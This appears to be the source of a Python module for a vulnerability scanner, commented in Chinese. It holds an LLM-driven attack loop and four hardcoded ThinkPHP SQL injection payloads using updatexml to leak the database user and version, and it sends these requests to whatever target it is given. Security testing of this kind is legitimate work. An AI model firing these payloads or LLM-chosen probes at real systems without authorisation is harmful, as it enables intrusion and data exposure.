"""
scanner.engine.simulator
-----------------------
模拟攻击核心引擎（Attack Simulation Engine） - LLM 增强版
"""

import asyncio
import time
import uuid
import json
import logging
from dataclasses import dataclass, field
from typing import Dict, List, Any, Optional, Tuple
from enum import Enum, auto
import httpx

from scanner.engine.llm_provider import LLMProvider
from scanner.engine.recon import ReconEngine
from scanner.engine.rules import RuleEngine, FRAMEWORK_NAME_MAP, FrameworkType

logger = logging.getLogger(__name__)

class AttackPhase(Enum):
    RECONNAISSANCE = auto()
    WEAPONIZATION = auto()
    EXPLOITATION = auto()
    VERIFICATION = auto()
    IMPACT_ASSESSMENT = auto()

class AttackStatus(Enum):
    PENDING = "pending"
    RUNNING = "running"
    SUCCESS = "success"
    FAILED = "failed"
    BLOCKED = "blocked"

@dataclass
class AttackStep:
    step_id: str
    phase: AttackPhase
    stage_name: str
    url: str
    method: str = "GET"
    payload: str = ""
    status_code: int = 0
    response_body: str = ""
    success: bool = False
    duration_ms: float = 0.0

class AttackSimulator:
    """
    LLM 驱动的模拟攻击引擎。
    实现“探测-学习-反应”闭环。
    """
    def __init__(self, target: str, strategy: str = "intelligent"):
        self.target = target.rstrip("/")
        self.strategy = strategy
        self.llm = LLMProvider()
        self.recon_engine = ReconEngine()
        self.rule_engine = RuleEngine()
        self.history: List[AttackStep] = []
        self.detected_frameworks = []
        self.framework_versions = {}
        self.context: Dict[str, Any] = {
            "target": self.target,
            "technologies": [],
            "detected_frameworks": [],  # 侦察阶段检测到的框架
            "tech_versions": {},        # 技术版本信息
            "entry_points": [],         # 侦察阶段发现的入口点
            "current_phase": "init",
            "history": []
        }

    def set_recon_context(self, context: Dict[str, Any]):
        """接收第一阶段 ScannerEngine 的侦察结果，作为 LLM 决策的上下文"""
        self.detected_frameworks = context.get('detected_frameworks', [])
        self.framework_versions = context.get('framework_versions', {})

        # 更新上下文供 LLM 使用
        self.context['detected_frameworks'] = context.get('detected_frameworks', [])
        self.context['tech_versions'] = context.get('framework_versions', {})
        self.context['entry_points'] = context.get('entry_points', [])
        self.context['already_found_vulns'] = context.get('already_found_vulns', [])
        self.context['technologies'] = context.get('technologies', [])
        
    async def run_simulation(self) -> Dict[str, Any]:
        """执行完整的模拟攻击流程"""
        logger.info(f"🚀 开始对 {self.target} 进行模拟攻击 (策略: {self.strategy})")
        
        async with httpx.AsyncClient(timeout=20.0, verify=False) as client:
            # 1. 侦察阶段
            recon_result = await self.recon_engine.deep_recon(self.target, client)
            self.context["technologies"] = [t.name for t in recon_result.technologies]
            
            # 保存框架检测结果 (从 ReconResult 中提取)
            if recon_result.primary_framework:
                fw_lower = recon_result.primary_framework.lower()
                if fw_lower in FRAMEWORK_NAME_MAP:
                    self.detected_frameworks.append(FRAMEWORK_NAME_MAP[fw_lower])
                logger.info(f"📦 主框架: {recon_result.primary_framework}")
            
            # 更新上下文,供 LLM 动态决策
            self.context["detected_frameworks"] = [fw.value for fw in self.detected_frameworks]
            self.context["tech_versions"] = self.framework_versions
            
            # 提取侦察阶段发现的入口点
            if recon_result.entry_points:
                self.context["entry_points"] = recon_result.entry_points[:5]
            else:
                # 根据检测到的技术栈生成默认入口点
                tech_lower = [t.lower() for t in self.context['technologies']]
                if 'thinkphp' in ' '.join(tech_lower) or 'php' in tech_lower:
                    self.context["entry_points"] = ["/index.php", "/?s=/index/index/index"]
                elif 'drupal' in ' '.join(tech_lower):
                    self.context["entry_points"] = ["/user/register", "/node/"]
                elif 'wordpress' in ' '.join(tech_lower):
                    self.context["entry_points"] = ["/wp-login.php", "/xmlrpc.php"]
            
            logger.info(f"🔍 侦察完成，识别技术栈: {self.context['technologies']}")
            logger.info(f"📦 检测到的框架: {self.context['detected_frameworks']}")
            logger.info(f"🔑 发现的入口点: {self.context['entry_points']}")

            # 2. VULHUB 快速扫描: 直接注入预定义 payload
            logger.info("🔧 开始 VULHUB 快速扫描...")
            found_vulns = []
            vulhub_payloads = [
                {"path": "index.php", "params": {"s": "/index/index/index", "ids[0,updatexml(0,concat(0xa,user()),0)]": "1"}},
                {"path": "index.php", "params": {"s": "/index/index/index", "ids[0,updatexml(0,concat(0xa,version()),0)]": "1"}},
                {"path": "index.php", "params": {"s": "/index/index/index", "where[id]": "0,updatexml(0,concat(0xa,user()),0)"}},
                {"path": "index.php", "params": {"s": "/index/index/index", "order[id]": "0,updatexml(0,concat(0xa,user()),0)"}},
            ]
            
            for pp in vulhub_payloads:
                try:
                    resp = await client.get(f"{self.target}/{pp['path']}", params=pp["params"], follow_redirects=True)
                    step = AttackStep(
                        step_id=f"vulhub-{uuid.uuid4().hex[:8]}",
                        phase=AttackPhase.EXPLOITATION,
                        stage_name="thinkphp_sqli_probe",
                        url=str(resp.url),
                        payload=str(pp["params"]),
                        status_code=resp.status_code,
                        response_body=resp.text,
                        success=self._is_potential_vuln_basic(resp),
                        duration_ms=0
                    )
                    self.history.append(step)
                    
                    if self._is_potential_vuln(step):
                        logger.info(f"🎯 疑似 ThinkPHP SQL 注入,规则引擎验证...")
                        is_valid, reason = self.rule_engine.validate_vulnerability(
                            plugin_id="thinkphp-sqli",
                            detected_frameworks=self.detected_frameworks,
                            response_body=resp.text,
                            response_headers=dict(resp.headers),
                            request_url=str(resp.url),
                            matched_keywords=[],
                            framework_versions=self.framework_versions,
                            request_payload=str(pp["params"]),
                        )
                        
                        if is_valid:
                            logger.info(f"✅ 规则引擎确认: {reason}")
                            
                            found_vulns.append(self._build_vuln_record(
                                url=str(resp.url),
                                payload=str(pp["params"]),
                                reason=reason,
                                status_code=resp.status_code,
                                duration_ms=0,
                                response_body=resp.text,
                                scenario_id="thinkphp-sqli",
                                stage_name="thinkphp_sqli_probe",
                                stage_title="ThinkPHP SQL 注入探测",
                                stage_goal="验证 ThinkPHP SQL 注入漏洞",
                                confidence=0.8,
                            ))
                        else:
                            logger.info(f"❌ 规则引擎未确认: {reason}")
                except Exception as e:
                    logger.warning(f"VULHUB payload 测试失败: {e}")
            
            # 如果已发现漏洞,直接返回结果,不再进行 LLM 循环
            if found_vulns:
                logger.info(f"✅ VULHUB 扫描完成,发现 {len(found_vulns)} 个漏洞")
                return {
                    "target": self.target,
                    "vulnerabilities": found_vulns,
                    "scan_history_count": len(self.history),
                    "status": "completed"
                }

            # 3. 模拟攻击循环 (LLM 决策,仅当 VULHUB 未找到漏洞时)
            max_rounds = 10
            for i in range(max_rounds):
                
                # 调用 LLM 决策下一步
                decision = await self.llm.decide_next_step(self.context)
                logger.info(f"🤖 LLM 决策 (第 {i+1} 轮): {decision['action']} - {decision['reason']}")

                if decision["action"] == "terminate":
                    break
                
                # 执行攻击动作
                path = decision.get("next_target_path", "")
                if isinstance(path, list):
                    path = path[0] if path else ""
                elif not isinstance(path, str):
                    path = str(path) if path else ""
                url = f"{self.target}/{path.lstrip('/')}"
                payload = decision.get("payload_mutation", "test")
                if isinstance(payload, list):
                    payload = payload[0] if payload else "test"
                elif not isinstance(payload, str):
                    payload = str(payload) if payload else "test"
                
                step = await self._execute_attack_step(client, url, payload)
                self.history.append(step)
                
                # 更新上下文
                self.context["last_status"] = step.status_code
                self.context["last_response_snippet"] = step.response_body[:500]
                self.context["history"].append({
                    "url": step.url,
                    "payload": step.payload,
                    "status": step.status_code,
                    "success": step.success
                })

                # 3. 规则引擎验证 (替代原有简单判断)
                if self._is_potential_vuln(step):
                    logger.info(f"🎯 发现疑似漏洞，开始规则引擎验证...")
                    
                    # 使用规则引擎验证
                    is_valid, validation_reason = self.rule_engine.validate_vulnerability(
                        plugin_id="thinkphp-sqli",
                        detected_frameworks=self.detected_frameworks,
                        response_body=step.response_body,
                        response_headers={},
                        request_url=step.url,
                        matched_keywords=[],
                        framework_versions=self.framework_versions,
                        request_payload=step.payload,
                    )
                    
                    if is_valid:
                        logger.info(f"✅ 规则引擎确认漏洞有效: {validation_reason}")
                        
                        found_vulns.append(self._build_vuln_record(
                            url=step.url,
                            payload=step.payload,
                            reason=validation_reason,
                            status_code=step.status_code,
                            duration_ms=step.duration_ms,
                            response_body=step.response_body,
                            scenario_id="thinkphp-sqli",
                            stage_name="thinkphp_sqli_probe",
                            stage_title="ThinkPHP SQL 注入探测",
                            stage_goal="验证 ThinkPHP SQL 注入漏洞",
                            confidence=0.8,
                        ))
                    else:
                        # 回退到 LLM 验证
                        logger.info(f"🔄 规则引擎未确认，尝试 LLM 验证...")
                        evidence = {
                            "vuln_name": "Potential Vulnerability",
                            "url": step.url,
                            "payload": step.payload,
                            "status_code": step.status_code,
                            "response_body": step.response_body[:2000]
                        }
                        verification = await self.llm.verify_vulnerability(evidence)
                        
                        if verification.get("is_valid"):
                            logger.info(f"✅ LLM 确认漏洞有效: {verification['analysis']}")
                            
                            found_vulns.append(self._build_vuln_record(
                                url=step.url,
                                payload=step.payload,
                                reason=verification.get("analysis", "LLM 确认"),
                                status_code=step.status_code,
                                duration_ms=step.duration_ms,
                                response_body=step.response_body,
                                scenario_id="llm-discovered",
                                stage_name="llm_dynamic_probe",
                                stage_title="LLM 动态探测",
                                stage_goal="LLM 自主发现漏洞",
                                confidence=0.6,
                                verification_result=verification,
                            ))
                        else:
                            logger.info(f"❌ LLM 判定为误报: {verification['analysis']}")

            return {
                "target": self.target,
                "vulnerabilities": found_vulns,
                "scan_history_count": len(self.history),
                "status": "completed"
            }

    async def _execute_attack_step(self, client: httpx.AsyncClient, url: str, payload: str) -> AttackStep:
        start_time = time.perf_counter()
        try:
            # 简单演示：这里可以根据 LLM 建议调整方法和参数位置
            resp = await client.get(url, params={"q": payload})
            duration = (time.perf_counter() - start_time) * 1000
            
            return AttackStep(
                step_id=str(uuid.uuid4())[:8],
                phase=AttackPhase.EXPLOITATION,
                stage_name="dynamic_probe",
                url=url,
                payload=payload,
                status_code=resp.status_code,
                response_body=resp.text,
                success=self._is_potential_vuln_basic(resp),
                duration_ms=duration
            )
        except Exception as e:
            return AttackStep(
                step_id=str(uuid.uuid4())[:8],
                phase=AttackPhase.EXPLOITATION,
                stage_name="error",
                url=url,
                payload=payload,
                status_code=0,
                response_body=str(e),
                success=False
            )

    def _is_potential_vuln_basic(self, resp: httpx.Response) -> bool:
        # 基础启发式判断
        indicators = [
            "sql syntax", "mysql_fetch", "<script>alert", "etc/passwd", "uid=",
            # ThinkPHP 调试页面特征
            "call stack", "connection.php", "query.php", "pdoexception",
            "thinkphp_show_page_trace", "environment variables",
        ]
        return any(ind in resp.text.lower() for ind in indicators)

    def _is_potential_vuln(self, step: AttackStep) -> bool:
        return step.success or step.status_code == 500

    def _extract_parameter_from_url(self, url: str) -> Optional[str]:
        """从 URL 中提取注入参数名"""
        if "?" not in url:
            return None
        query = url.split("?", 1)[1]
        for part in query.split("&"):
            if "=" in part:
                param_name = part.split("=", 1)[0]
                if param_name not in ("s",):
                    return param_name
        return None

    FRAMEWORK_VULN_MAP = {
        'thinkphp': 'ThinkPHP SQL Injection',
        'django': 'Django SQL Injection',
        'flask': 'Flask SQL Injection',
        'laravel': 'Laravel SQL Injection',
        'spring': 'Spring Boot Injection',
        'wordpress': 'WordPress SQL Injection',
        'drupal': 'Drupal SQL Injection',
        'joomla': 'Joomla SQL Injection',
        'express': 'Express.js Injection',
        'asp.net': 'ASP.NET Injection',
        'ruby on rails': 'Ruby on Rails Injection',
    }

    def _infer_vuln_type(self, verification_result: Optional[Dict[str, Any]] = None) -> str:
        """基于检测到的框架类型动态推断漏洞类型"""
        if verification_result and verification_result.get("vuln_type"):
            return verification_result["vuln_type"]

        if not self.detected_frameworks:
            return "Potential Vulnerability"

        framework = self.detected_frameworks[0]
        framework_lower = framework.value.lower() if hasattr(framework, "value") else str(framework).lower()

        for framework_pattern, vuln_type in self.FRAMEWORK_VULN_MAP.items():
            if framework_pattern in framework_lower:
                return vuln_type

        return "SQL Injection"

    def _build_vuln_record(
        self,
        url: str,
        payload: str,
        reason: str,
        status_code: int,
        duration_ms: float,
        response_body: str,
        scenario_id: str,
        stage_name: str,
        stage_title: str,
        stage_goal: str,
        confidence: float = 0.8,
        verification_result: Optional[Dict[str, Any]] = None,
    ) -> Dict[str, Any]:
        """构建标准化漏洞记录"""
        parameter = self._extract_parameter_from_url(url)
        vuln_type = self._infer_vuln_type(verification_result)

        return {
            "url": url,
            "payload": payload,
            "evidence": {
                "matchers": [],
                "confidence": confidence,
                "response_status": status_code,
                "response_time_ms": duration_ms,
                "response_body_snippet": response_body[:1000],
                "framework_validation": {
                    "is_valid": True,
                    "reason": reason,
                },
                "attack_stage_count": 1,
                "attack_artifacts": [],
            },
            "llm_analysis": f"规则引擎验证: {reason}" if verification_result is None else reason,
            "validation_log": {
                "attack_status": "exploitable",
                "attack_stage_count": 1,
                "artifacts": [],
                "vuln_type": vuln_type,
                "parameter": parameter,
            },
            "attack_path": {
                "scenario_id": scenario_id,
                "status": "validated",
                "steps": [
                    {
                        "step": 1,
                        "stage_id": f"{scenario_id}-probe",
                        "stage_name": stage_name,
                        "stage_title": stage_title,
                        "stage_goal": stage_goal,
                        "method": "GET",
                        "url": url,
                        "description": reason,
                        "matched_conditions": [],
                        "success": True,
                        "duration_ms": duration_ms,
                        "response_status": status_code,
                    }
                ],
                "request": {
                    "method": "GET",
                    "url": url,
                },
                "artifacts": [],
                "final_reason": reason,
            },
        }

def create_simulator(target: str, strategy: str = "intelligent") -> AttackSimulator:
    return AttackSimulator(target=target, strategy=strategy)
